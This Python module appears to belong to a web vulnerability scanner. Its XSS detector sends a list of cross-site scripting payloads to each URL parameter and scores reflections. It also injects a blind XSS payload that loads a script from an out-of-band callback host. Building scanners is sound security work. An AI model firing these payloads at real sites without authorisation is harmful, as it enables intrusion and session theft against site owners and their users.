import logging
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

from ..payloads.xss_payloads import XSS_PAYLOADS, XSS_CONFIRMATION_SIGNATURES, XSS_CANARY
from ..utils.http_client import HttpClient
from ..utils.response_analyzer import ResponseAnalyzer
from ..utils.confidence import calculate_confidence, classify_confidence
from ..intelligence.oob_manager import oob

logger = logging.getLogger(__name__)

_MAX_WORKERS = 20

class XSSDetector:
    """XSS detector with Blind XSS (OOB) support."""

    vuln_type = "Cross-Site Scripting (XSS)"

    def __init__(self, session=None):
        self.http = HttpClient(session=session)
        self.analyzer = ResponseAnalyzer()

    def detect(self, url: str, params: dict, extra_payloads: list = None) -> list:
        findings = []
        for param, original_value in params.items():
            result = self._test_parameter(url, params, param, extra_payloads)
            if result:
                findings.append(result)
        return findings

    def _test_parameter(self, url: str, all_params: dict, param: str, extra_payloads: list = None):
        baseline = self.http.get(url, params=all_params)
        if baseline["status_code"] == 0:
            return None

        result_holder = []
        
        # 1. Blind XSS OOB Payload
        oob_token = oob.generate_token()
        oob_url = oob.get_http_payload(oob_token)
        # Blind XSS payload that tries to load a remote script
        blind_payload = f"\"><script src=\"{oob_url}\"></script>"
        
        payloads_to_test = list(XSS_PAYLOADS) + [blind_payload]
        if extra_payloads:
            payloads_to_test.extend(extra_payloads)

        with ThreadPoolExecutor(max_workers=_MAX_WORKERS) as executor:
            futures = {
                executor.submit(
                    self._test_single_payload, url, all_params, param, payload, baseline
                ): payload
                for payload in payloads_to_test
            }
            for future in as_completed(futures):
                try:
                    res = future.result()
                    if res:
                        result_holder.append(res)
                        break
                except Exception as exc:
                    logger.warning(f"XSS payload future error: {exc}")

        # 2. Final Blind XSS Check
        if not result_holder:
            # Blind XSS can take time to be triggered by an admin
            # In a real scan, we'd poll this asynchronously, but here we'll 
            # do a quick check (simulating immediate reflection in a background process)
            if oob.check_interactions(oob_token):
                confidence = calculate_confidence(True, True, False)
                return {
                    "type": self.vuln_type,
                    "parameter": param,
                    "confidence": confidence,
                    "status": "Confirmed",
                    "evidence": {
                        "payload": blind_payload,
                        "reflected": "Blind Callback detected",
                        "signatures_matched": ["Blind XSS OOB Hit"],
                        "detail": "Out-of-band script execution detected."
                    }
                }

        return result_holder[0] if result_holder else None

    def _test_single_payload(self, url: str, all_params: dict, param: str, payload: str, baseline: dict):
        test_params = dict(all_params)
        test_params[param] = payload

        test_resp = self.http.get(url, params=test_params)
        if test_resp["status_code"] == 0:
            return None

        sigs = self.analyzer.find_signatures(test_resp["body"], XSS_CONFIRMATION_SIGNATURES)
        server_err = self.analyzer.is_server_error(test_resp["status_code"])

        exploit_success = (payload.lower() in test_resp["body"].lower()) or bool(sigs)
        strong_sig = bool(sigs)

        confidence = calculate_confidence(exploit_success, strong_sig, server_err)
        status = classify_confidence(confidence)

        if status != "Discard":
            return {
                "type": self.vuln_type,
                "parameter": param,
                "confidence": confidence,
                "status": status,
                "evidence": {
                    "payload": payload,
                    "reflected": True,
                    "signatures_matched": sigs,
                    "status_code": test_resp["status_code"],
                },
            }
        return None
